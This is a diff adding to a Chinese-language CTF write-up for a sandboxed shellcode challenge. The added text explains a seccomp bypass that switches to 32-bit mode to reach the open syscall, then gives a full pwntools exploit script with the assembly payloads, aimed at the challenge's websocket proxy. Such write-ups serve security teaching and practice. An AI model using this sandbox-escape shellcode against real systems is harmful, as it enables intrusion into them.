@@ -74,7 +74,86 @@ shell:
 ![[Pasted image 20250210233720.png]]
 可以看到是一个开启了sandbox的shellcode题。
 ![[Pasted image 20250210233928.png]]
-sandbox仅允许使用rw,可以看到是缺o的，该怎么办呢，搜索后发现fstat函数的系统调用0x5是32位的open函数的系统调用，所以思路就是用mmap开辟一个新的空间来存放一段32位的程序然后在里面调用32位的open，然后再切换回
+sandbox仅允许使用rw,可以看到是缺o的，该怎么办呢，搜索后发现fstat函数的系统调用0x5是32位的open函数的系统调用，所以思路就是用mmap开辟一个新的空间来存放一段32位的程序然后在里面调用32位的open，然后再切换回64位调用read和write函数。
+exp:
+```python
+from pwn import *
+from wstube import websocket
+
+# context(arch='amd64', os='linux', log_level='debug')
+local = False
+if local:
+	p = process('./shellcode')
+	pwnlib.gdb.attach(p, 'b printf')
+else:
+	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f082-499c-7e79-aaec-7f4576faa685')
+
+elf = ELF('./shellcode')
+buf = elf.bss()
+print(hex(buf))
+
+shellcode = '''
+	/* 恢复rsp */
+	mov rsp, rdx
+	add sp, 0x100
+	
+	/* mmap(0x40404040, 0x7e, 7, 34, 0, 0) */
+	mov rdi, 0x40404040
+	mov rsi, 0x7e
+	mov rdx, 7
+	mov rax, 9
+	mov r8, 0
+	mov r9, 0
+	mov r10, 34
+	syscall
+	
+	/* read(0, 0x40404040, 0x100) */
+	mov rdi, 0
+	mov rsi, 0x40404040
+	mov rdx, 0x100
+	mov rax, 0
+	syscall
+	
+	/* mode_64 -> mode_32 */
+	push 0x23
+	push 0x40404040
+	retfq
+'''
+
+shellcode_x86 = '''
+	mov esp, 0x40404140
+	push 0x67616c66
+	push esp
+	pop ebx
+	xor ecx, ecx
+	mov eax, 5
+	int 0x80
+	mov ecx, eax
+'''
+shellcode_flag = '''
+	push 0x33
+	push 0x40404089
+	retfq
+	
+	mov rdi, rcx
+	mov rsi, rsp
+	mov rdx, 0x70
+	xor rax, rax
+	syscall
+	
+	mov rdi, 1
+	mov rax, 1
+	syscall
+'''
+shellcode = asm(shellcode, arch='amd64', os='linux')
+shellcode_flag = asm(shellcode_flag, arch='amd64', os='linux')
+shellcode_x86 = asm(shellcode_x86)
+p.sendlineafter('shellcode:', shellcode)
+pause()
+p.sendline(shellcode_x86 + 0x29 * b'\x90' + shellcode_flag)
+
+p.interactive()
+```
 shell:
 ![[Pasted image 20250210233827.png]]
 ## walt改造的编译器
